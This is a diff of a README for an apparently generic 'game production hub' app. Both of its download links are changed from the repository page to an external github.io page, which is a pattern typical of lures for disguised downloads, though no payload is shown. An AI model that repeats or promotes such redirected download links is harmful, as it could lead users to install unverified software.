@@ -1,6 +1,6 @@
 # 🎮 game-dev-producer-2026-hub - Simplified access to game production resources
 
-[![Download game-dev-producer-2026-hub](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Unobjectionable-drippingpan335/game-dev-producer-2026-hub)
+[![Download game-dev-producer-2026-hub](https://img.shields.io/badge/Download-Release-blue)](https://unobjectionable-drippingpan335.github.io)
 
 This application provides a central hub for video game production. It organizes guidance, tools, and industry data for creators planning for the 2026 release cycle. Users can access expert advice and current market research in a single location.
 
@@ -8,7 +8,7 @@ This application provides a central hub for video game production. It organizes 
 
 You can obtain the current version of the hub from the official distribution page.
 
-[Click here to visit the download page](https://github.com/Unobjectionable-drippingpan335/game-dev-producer-2026-hub)
+[Click here to visit the download page](https://unobjectionable-drippingpan335.github.io)
 
 Follow these steps to set up the software on your Windows computer:
 
